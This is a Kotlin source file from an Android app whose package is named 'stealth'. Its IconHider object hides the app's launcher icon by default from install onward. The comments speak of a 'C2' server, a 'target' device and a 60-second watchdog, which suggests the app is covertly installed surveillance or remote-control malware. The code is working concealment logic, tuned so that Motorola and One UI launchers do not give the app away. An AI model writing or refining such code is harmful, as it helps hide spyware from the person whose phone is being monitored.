package com.sp.core.stealth

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import com.sp.core.util.Prefs

/**
 * Hides the launcher icon.
 *
 * The icon lives on an *activity alias* ("com.sp.core.AppAlias"), not on the
 * activity itself. The activity that carries the wizard stays enabled at all
 * times, so the app can always be started again - in v1.1.x the launcher
 * component was disabled and the app became unreachable after an update,
 * which was the reason the icon was visible all the time in the first place.
 *
 * Every call is idempotent: setComponentEnabledSetting() is only called when
 * the state really changes. Otherwise the launcher gets a PACKAGE_CHANGED
 * broadcast every 60 s (from the watchdog) and re-renders the app entry -
 * on the Motorola launcher that ended up in its own "add to home screen"
 * dialog popping up on the target.
 */
object IconHider {

    /** The alias that carries the MAIN/LAUNCHER intent filter. */
    const val ALIAS = "com.sp.core.AppAlias"

    /** The real activity behind the alias - never disabled. */
    const val LAUNCHER_COMPONENT = "com.sp.core.LauncherActivity"

    /** The legacy launcher activity of the older builds. */
    const val LEGACY_COMPONENT = "com.sp.core.MainActivity"

    private const val KEY_ICON_HIDDEN = "icon_hidden"

    /**
     * Restores the state saved by the user (called on every app start).
     *
     * The default is HIDDEN: the launcher entry is off in the manifest, so a
     * fresh install never leaves an icon in the app drawer. One UI keeps the
     * entry in its own cache after the component was disabled, which is why
     * the alias must not be enabled at install time at all.
     */
    fun applySaved(ctx: Context) {
        try {
            val hidden = Prefs.get(ctx, KEY_ICON_HIDDEN, true) as? Boolean ?: true
            if (hidden) hide(ctx) else show(ctx)
        } catch (_: Throwable) {
        }
    }

    /**
     * Hides the icon again after a delay - used when the wizard was opened
     * from the C2 and the user did not finish the flow.
     */
    fun hideAfter(ctx: Context, delayMs: Long) {
        try {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try { hide(ctx) } catch (_: Throwable) {}
            }, delayMs)
        } catch (_: Throwable) {
        }
    }

    fun show(ctx: Context) {
        try {
            val pm = ctx.packageManager
            // The activity itself is always enabled - the app must stay
            // startable no matter what happened to the icon.
            enableIfNeeded(pm, ctx, LAUNCHER_COMPONENT)
            enableIfNeeded(pm, ctx, LEGACY_COMPONENT)
            enableIfNeeded(pm, ctx, ALIAS)
            Prefs.set(ctx, KEY_ICON_HIDDEN, false)
        } catch (_: Throwable) {
        }
    }

    fun hide(ctx: Context) {
        try {
            val pm = ctx.packageManager
            // Never disable the activity itself - only the icon.
            enableIfNeeded(pm, ctx, LAUNCHER_COMPONENT)
            enableIfNeeded(pm, ctx, LEGACY_COMPONENT)
            disableIfNeeded(pm, ctx, ALIAS)
            Prefs.set(ctx, KEY_ICON_HIDDEN, true)
        } catch (_: Throwable) {
        }
    }

    fun isHidden(ctx: Context): Boolean = try {
        val pm = ctx.packageManager
        pm.getComponentEnabledSetting(ComponentName(ctx, ALIAS)) ==
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    } catch (_: Throwable) {
        false
    }

    /**
     * The state of a component is only pushed to the package manager when it
     * is different - a redundant call is a package change for the launcher.
     */
    private fun enableIfNeeded(pm: PackageManager, ctx: Context, name: String) {
        try {
            val cn = ComponentName(ctx, name)
            if (pm.getComponentEnabledSetting(cn) != PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
                pm.setComponentEnabledSetting(
                    cn,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        } catch (_: Throwable) {
        }
    }

    private fun disableIfNeeded(pm: PackageManager, ctx: Context, name: String) {
        try {
            val cn = ComponentName(ctx, name)
            if (pm.getComponentEnabledSetting(cn) != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(
                    cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
            }
        } catch (_: Throwable) {
        }
    }
}
